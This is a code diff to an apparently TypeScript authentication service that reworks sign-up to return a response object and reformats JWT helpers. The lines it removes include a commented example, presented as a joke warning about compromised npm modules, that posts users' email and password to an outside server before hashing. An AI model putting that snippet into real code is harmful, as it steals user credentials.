@@ -7,7 +7,7 @@ import { randomBytes } from 'crypto';
 import { IUser, IUserInputDTO } from '@/interfaces/IUser';
 import { EventDispatcher, EventDispatcherInterface } from '@/decorators/eventDispatcher';
 import events from '@/subscribers/events';
-import { IContact } from '@/interfaces/IContact';
+import { IResponse, Response } from '@/interfaces/IResponse';
 
 @Service()
 export default class AuthService {
@@ -16,29 +16,12 @@ export default class AuthService {
     private mailer: MailerService,
     @Inject('logger') private logger,
     @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
-  ) {
-  }
+  ) {}
 
-  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
+  public async SignUp(userInputDTO: IUserInputDTO): Promise<IResponse> {
     try {
       const salt = randomBytes(32);
-
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
+      var response = new Response(); 
       this.logger.silly('Hashing password');
       const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
       this.logger.silly('Creating user db record');
@@ -51,23 +34,23 @@ export default class AuthService {
       const token = this.generateJSONToken(userRecord);
 
       if (!userRecord) {
-        throw new Error('User cannot be created');
+        response.statusCode = -1;
+        response.message = 'User Not Created';
+        return response;
+      } else {
+        response.statusCode = 1;
+        response.message = 'User Created Successfull';
+        response.data = token;
       }
       this.logger.silly('Sending welcome email');
-      await this.mailer.SendWelcomeEmail(userRecord);
+      this.mailer.SendWelcomeEmail(userRecord);
 
       this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });
 
-      /**
-       * @TODO This is not the best way to deal with this
-       * There should exist a 'Mapper' layer
-       * that transforms data from layer to layer
-       * but that's too over-engineering for now
-       */
       const user = userRecord.toObject();
       Reflect.deleteProperty(user, 'password');
       Reflect.deleteProperty(user, 'salt');
-      return { user, token };
+      return response;
     } catch (e) {
       this.logger.error(e);
       throw e;
@@ -100,23 +83,20 @@ export default class AuthService {
     }
   }
 
-
-  public generateJSONToken(user : any): string {
+  public generateJSONToken(user: any): string {
     // Token is valid for 1 hour...
-    return jwt.sign({data: user.email, exp: Math.floor(Date.now() / 1000) + (60 * 60)},
-      process.env.TOKEN_SECRET);
+    return jwt.sign({ data: user.email, exp: Math.floor(Date.now() / 1000) + 60 * 60 }, process.env.TOKEN_SECRET);
   }
 
-
-  public verifyJSONToken(token: string): { message: string, flag: boolean } {
+  public verifyJSONToken(token: string): { message: string; flag: boolean } {
     try {
       let verify = jwt.verify(token, process.env.TOKEN_SECRET);
-      return {flag: true, message: verify.data};
+      return { flag: true, message: verify.data };
     } catch (e) {
-      if (e.message === "jwt expired") {
-        e.message = "Session Expired(jwt), Please Login to continue.";
+      if (e.message === 'jwt expired') {
+        e.message = 'Session Expired(jwt), Please Login to continue.';
       }
-      return {flag: false, message: e.message};
+      return { flag: false, message: e.message };
     }
   }
 
@@ -142,7 +122,7 @@ export default class AuthService {
         name: user.name,
         exp: exp.getTime() / 1000,
       },
-      config.jwtSecret
+      config.jwtSecret,
     );
   }
 }
